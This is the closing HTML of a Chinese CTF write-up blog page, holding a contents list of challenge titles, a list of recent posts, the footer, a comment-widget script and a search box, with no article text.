id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-file"><span class="toc-number">1.</span> <span class="toc-text">easy_file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nest-js"><span class="toc-number">2.</span> <span class="toc-text">nest_js</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-1"><span class="toc-number">4.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF"><span class="toc-number">5.</span> <span class="toc-text">君の名は</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/07/hnctf/" title="hnctf"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover52.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hnctf"/></a><div class="content"><a class="title" href="/2025/06/07/hnctf/" title="hnctf">hnctf</a><time datetime="2025-06-07T12:40:56.000Z" title="发表于 2025-06-07 20:40:56">2025-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/04/D3CTF-1/" title="D3CTF"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover90.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="D3CTF"/></a><div class="content"><a class="title" href="/2025/06/04/D3CTF-1/" title="D3CTF">D3CTF</a><time datetime="2025-06-04T08:31:19.000Z" title="发表于 2025-06-04 16:31:19">2025-06-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/03/D3CTF/" title="D3CTF"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover47.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="D3CTF"/></a><div class="content"><a class="title" href="/2025/06/03/D3CTF/" title="D3CTF">D3CTF</a><time datetime="2025-06-03T10:36:03.000Z" title="发表于 2025-06-03 18:36:03">2025-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/03/litCTF/" title="litCTF"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover81.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="litCTF"/></a><div class="content"><a class="title" href="/2025/06/03/litCTF/" title="litCTF">litCTF</a><time datetime="2025-06-03T10:34:45.000Z" title="发表于 2025-06-03 18:34:45">2025-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" title="fastjson&amp;&amp;snakeyaml不出网利用"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover52.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastjson&amp;&amp;snakeyaml不出网利用"/></a><div class="content"><a class="title" href="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" title="fastjson&amp;&amp;snakeyaml不出网利用">fastjson&amp;&amp;snakeyaml不出网利用</a><time datetime="2025-05-29T02:06:01.000Z" title="发表于 2025-05-29 10:06:01">2025-05-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By L</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://tw-sigma.vercel.app/',
+      region: 'ap-guangzhou',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(init)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://tw-sigma.vercel.app/',
+      region: 'ap-guangzhou',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+      
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="/js/LSE.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
